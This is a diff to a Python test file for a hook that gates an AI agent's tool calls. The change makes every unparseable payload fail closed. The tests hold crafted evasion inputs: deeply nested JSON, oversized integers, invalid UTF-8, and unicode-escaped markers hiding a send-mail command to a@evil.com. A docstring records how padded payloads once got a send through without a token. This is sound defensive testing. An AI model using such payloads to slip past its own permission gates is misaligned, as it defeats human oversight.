@@ -408,10 +408,10 @@ def test_broken_website_deploy_tier_fails_closed():
     print("PASS test_broken_website_deploy_tier_fails_closed")
 
 
-def test_malformed_stdin_fails_open():
+def test_malformed_stdin_fails_closed():
     proc = subprocess.run([sys.executable, HOOK], input="not json", capture_output=True, text=True)
-    assert proc.returncode == 0, "malformed stdin must exit 0, got %s" % proc.returncode
-    print("PASS test_malformed_stdin_fails_open")
+    assert proc.returncode == 2, "malformed stdin must exit 2, got %s" % proc.returncode
+    print("PASS test_malformed_stdin_fails_closed")
 
 
 # --------------------------------------------------------------------------
@@ -2014,8 +2014,8 @@ def test_unparseable_payload_naming_a_gated_tool_fails_closed():
     """Review finding C8. json.loads raises RecursionError on deeply nested input and main()
     treated EVERY parse failure as 'not a payload we can evaluate' -> exit 0, so a padded extra
     key let a live send/publish through with no token. A payload that cannot be parsed but
-    NAMES a gated tool must now block. Payloads that name nothing gated keep the old
-    fail-open, so a genuinely broken harness still cannot brick the session."""
+    NAMES a gated tool must block (every unparseable payload now does; see
+    test_unparseable_payload_fails_closed_for_every_tool)."""
     deep = "[" * 5000 + "]" * 5000
     cases = (
         (MS365 + "outlook_send_mail", '{"to":["a@evil.com"],"subject":"s","body":"b","x":%s}' % deep),
@@ -2027,12 +2027,55 @@ def test_unparseable_payload_naming_a_gated_tool_fails_closed():
         raw = '{"tool_name":"%s","tool_input":%s,"session_id":"%s"}' % (tool, ti, SESSION_A)
         rc, _, err = run_raw(raw)
         assert rc == 2, "unparseable payload naming %s must fail closed, got %s (%s)" % (tool, rc, err)
-    raw = '{"tool_name":"Read","tool_input":{"x":%s},"session_id":"%s"}' % (deep, SESSION_A)
-    rc, _, err = run_raw(raw)
-    assert rc == 0, "an unparseable payload naming nothing gated must stay fail-open, got %s (%s)" % (rc, err)
-    rc, _, err = run_raw("not json at all")
-    assert rc == 0, "non-JSON naming nothing gated must stay fail-open, got %s (%s)" % (rc, err)
     print("PASS test_unparseable_payload_naming_a_gated_tool_fails_closed")
+
+
+def run_raw_bytes(raw):
+    env = dict(os.environ)
+    env["ORA_OVERRIDE_SESSIONS_DIR"] = fresh_sessions_dir()
+    proc = subprocess.run([sys.executable, HOOK], input=raw, capture_output=True, env=env)
+    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")
+
+
+def test_unparseable_payload_fails_closed_for_every_tool():
+    """The gate is only ever invoked for a gated matcher, and in production Bash/Edit/Write
+    already fail closed on garbage via confidentiality-guard inside the dispatcher, so failing
+    closed here costs nothing new. A marker scan (the prior MCP-only fix) cannot cover Bash:
+    the command is model-controlled and `\u006f`-style JSON escapes hide the marker from a raw
+    scan. So EVERY payload the gate cannot parse into a JSON object is refused."""
+    deep = "[" * 5000 + "]" * 5000
+    marker = "send-via-" + "outlook.ps1"
+    site = "website-" + "canonical"
+    escaped = "send-via-outl" + chr(92) + "u006fok.ps1"  # JSON text carries a literal backslash-u
+    cases = (
+        ("Bash", '{"command":"powershell %s -To a@evil.com","x":%s}' % (marker, deep)),
+        ("Bash", '{"command":"powershell %s -To a@evil.com","x":%s}' % (escaped, deep)),
+        ("Bash", '{"command":"ls","x":%s}' % deep),
+        ("Write", '{"file_path":"C:/Users/Owner/%s/i.html","content":"x","x":%s}' % (site, deep)),
+        ("Edit", '{"file_path":"C:/Users/Owner/%s/i.html","x":%s}' % (site, deep)),
+        ("MultiEdit", '{"file_path":"C:/Users/Owner/%s/i.html","x":%s}' % (site, deep)),
+        ("NotebookEdit", '{"notebook_path":"C:/Users/Owner/%s/n.ipynb","x":%s}' % (site, deep)),
+        ("Read", '{"x":%s}' % deep),
+        (MS365 + "outlook_email_search", '{"x":%s}' % deep),
+    )
+    for tool, ti in cases:
+        raw = '{"tool_name":"%s","tool_input":%s,"session_id":"%s"}' % (tool, ti, SESSION_A)
+        rc, out, err = run_raw(raw)
+        assert rc == 2, "unparseable %s payload must fail closed, got %s (%s)" % (tool, rc, err)
+        assert out == "" and "could not be parsed" in err, (out, err)
+    # int-digit cap is a second attacker-inducible ValueError (not RecursionError)
+    big = '{"tool_name":"Bash","tool_input":{"command":"ls","n":%s},"session_id":"s"}' % ("9" * 6000)
+    rc, _, err = run_raw(big)
+    assert rc == 2, "oversized-integer payload must fail closed, got %s (%s)" % (rc, err)
+    for junk in ("not json at all", "", "   ", "[]", "null", '"Bash"', "42"):
+        rc, _, err = run_raw(junk)
+        assert rc == 2, "non-object/unparseable stdin %r must fail closed, got %s (%s)" % (junk, rc, err)
+    rc, _, err = run_raw_bytes(b'{"tool_name":"Bash","tool_input":{"command":"' + bytes([0xff, 0xfe]) + b'"}}')
+    assert rc == 2, "invalid UTF-8 stdin must fail closed, got %s (%s)" % (rc, err)
+    # a well-formed benign payload is untouched
+    rc, _, err = run_hook(tool_payload("Bash", {"command": "ls"}))
+    assert rc == 0, "a parseable benign payload must still pass, got %s (%s)" % (rc, err)
+    print("PASS test_unparseable_payload_fails_closed_for_every_tool")
 
 
 def test_ms365_email_unknown_keys_fail_closed():
